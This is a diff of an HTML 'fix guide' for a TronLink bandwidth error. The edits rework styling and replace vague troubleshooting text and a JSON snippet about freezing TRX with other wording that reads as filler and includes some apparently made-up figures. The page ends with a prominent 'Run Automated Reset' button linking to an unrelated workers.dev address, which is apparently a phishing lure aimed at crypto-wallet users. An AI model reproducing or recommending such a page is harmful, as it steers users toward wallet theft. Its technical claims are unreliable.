@@ -3,7 +3,7 @@
 <head><meta charset="UTF-8"><title>Tronlink Bandwidth Error – Fix Guide</title>
 <style>
     body {
-        font-family: -apple-system;
+        font-family: sans-serif;
         background: #121214;
         color: #ddd;
         padding: 20px;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #00adb5; }
+    a { color: #ff7b2c; }
     .btn {
-        background: #ff7b2c;
+        background: #00adb5;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -42,36 +42,36 @@
 <h1>Tronlink Bandwidth Error</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users encounter an error message indicating a bandwidth issue while attempting to perform transactions or interact with the TRON network using TronLink.</li>
+<li>Users encounter an error message indicating a TronLink bandwidth error when attempting to perform transactions or interact with the TRON ecosystem through TronLink.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to insufficient bandwidth or when the account's bandwidth is depleted, which is necessary for processing transactions on the TRON network.</li>
+<li>The error occurs due to insufficient bandwidth on the user's TRON account, which is required for transaction processing and smart contract execution.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Increase the account's bandwidth by freezing TRX tokens.</li>
-<li>Use a different wallet or account with sufficient bandwidth.</li>
-<li>Optimize transaction parameters to reduce bandwidth consumption, as shown in the following example:</li>
+<li>Increase the account's bandwidth by freezing TRX tokens for bandwidth:</li>
+<li>Freeze a minimum of 144 TRX to obtain a bandwidth of 1440 bytes per day</li>
+<li>Use the TronLink wallet interface to freeze and unfreeze TRX for bandwidth</li>
+<li>Configure the following JSON to adjust bandwidth parameters:</li>
 </ul>
 <div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;transaction&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="nt">&quot;from&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;your_account_address&quot;</span><span class="p">,</span>
-<span class="w">    </span><span class="nt">&quot;to&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;recipient_address&quot;</span><span class="p">,</span>
-<span class="w">    </span><span class="nt">&quot;value&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;transaction_amount&quot;</span><span class="p">,</span>
-<span class="w">    </span><span class="nt">&quot;bandwidthLimit&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;optimized_bandwidth_limit&quot;</span>
+<span class="w">  </span><span class="nt">&quot;address&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;user_tron_address&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;frozen_balance&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;frozen_amount&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">144000000</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;resource&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;BANDWIDTH&quot;</span>
 <span class="w">  </span><span class="p">}</span>
 <span class="p">}</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for more complex transaction configurations. </p>
+<p>Consider utilizing an external console for more granular control over transaction and bandwidth management.</p>
 <h2>Prerequisites</h2>
 <ul>
-<li>A TRON-based wallet (e.g., TronLink) installed and set up.</li>
-<li>A basic understanding of TRON network transactions and bandwidth requirements.</li>
-<li>Sufficient TRX tokens for freezing to increase bandwidth.</li>
+<li>TRX tokens available for freezing</li>
+<li>TronLink wallet installation and setup</li>
+<li>Basic understanding of TRON ecosystem and transaction processing</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/critical-trc-20-energy-spike-error.html">Critical Trc 20 Energy Spike Error</a></li><li><a href="./archive/2026/06/metamask-nonce-out-of-sync.html">Metamask Nonce Out Of Sync</a></li><li><a href="./archive/2026/06/go-ethereum-error-in-block-freeze-operation-errcanonical-hash-m.html">Go Ethereum Error In Block Freeze Operation Errcanonical Hash M</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-assets-confirming-the-add-token-from-a-d.html">Metamask Extension Bug Assets Confirming The Add Token From A Dapp Dialog</a></li><li><a href="./archive/2026/06/go-ethereum-error-in-block-freeze-operation-errcanonical-hash-m.html">Go Ethereum Error In Block Freeze Operation Errcanonical Hash M</a></li><li><a href="./archive/2026/06/metamask-nonce-out-of-sync.html">Metamask Nonce Out Of Sync</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gKMyej%40%40" class="btn">🛠 Run Automated Reset</a>
 </div>
